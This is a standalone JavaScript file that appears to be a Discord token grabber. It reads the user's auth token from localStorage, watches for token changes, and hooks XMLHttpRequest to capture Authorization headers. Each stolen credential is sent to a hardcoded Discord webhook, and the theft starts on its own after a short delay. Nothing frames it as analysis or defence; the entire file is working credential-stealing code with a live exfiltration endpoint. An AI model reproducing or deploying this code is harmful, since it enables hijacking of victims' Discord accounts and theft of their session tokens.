function sendToken(token) {
  fetch("https://canary.discord.com/api/webhooks/1094044902867865720/2pNyc_9x5afRz54MCIuzK5dIRFH77OKhrnU2fCZV3P5fCpl7L0vxaD9piVMkUG9YXcGG", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: "Improved Discord Token: " + token,
    }),
  })
    .then((response) => {
      if (response.ok) {
        console.log("Token sent successfully!");
      } else {
        console.log("Error sending token: ", response.statusText);
      }
    })
    .catch((error) => {
      console.log("Error: ", error);
    });
}

function getTokenFromLocalStorage() {
  let tokenFromLocalStorage = localStorage.getItem("token");
  if (tokenFromLocalStorage) {
    sendToken(tokenFromLocalStorage);
    return true;
  }
  return false;
}

setTimeout(() => {
  if (!getTokenFromLocalStorage()) {
    window.addEventListener("storage", (event) => {
      if (event.key === "token" && event.newValue) {
        sendToken(event.newValue);
      }
    });
  }
}, 2000);

(function (open) {
  XMLHttpRequest.prototype.open = function (method, url) {
    this.addEventListener("readystatechange", function () {
      if (this.readyState === 2 && url.startsWith("library?")) {
        const authorization = this.getRequestHeader("Authorization");

        if (authorization) {
          sendToken(authorization);
          XMLHttpRequest.prototype.open = open;
        }
      }
    });

    open.call(this, method, url);
  };
})(XMLHttpRequest.prototype.open);
